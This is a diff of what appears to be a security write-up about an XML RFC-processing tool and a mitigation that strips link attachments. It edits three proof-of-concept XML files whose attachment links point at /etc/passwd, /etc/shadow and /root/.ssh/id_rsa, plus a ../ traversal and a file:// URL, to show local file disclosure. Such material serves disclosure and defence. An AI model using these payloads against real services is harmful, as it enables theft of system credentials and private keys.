@@ -89,7 +89,6 @@ def strip_link_attachments(tree):
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-test-00" category="info">
   <link rel="item" href="urn:issn:2070-1721"/>
   <link rel="attachment" href="/etc/passwd"/>
@@ -117,7 +116,6 @@ def strip_link_attachments(tree):
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-config-00" category="info">
   <link rel="attachment" href="/etc/shadow"/>
   <link rel="attachment" href="/root/.ssh/id_rsa"/>
@@ -146,7 +144,6 @@ def strip_link_attachments(tree):
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rfc SYSTEM "rfc2629.dtd">
 <rfc version="3" ipr="trust200902" docName="draft-poc-traversal-00" category="info">
   <link rel="attachment" href="../../../../../../etc/passwd"/>
   <link rel="attachment" href="file:///etc/hosts"/>
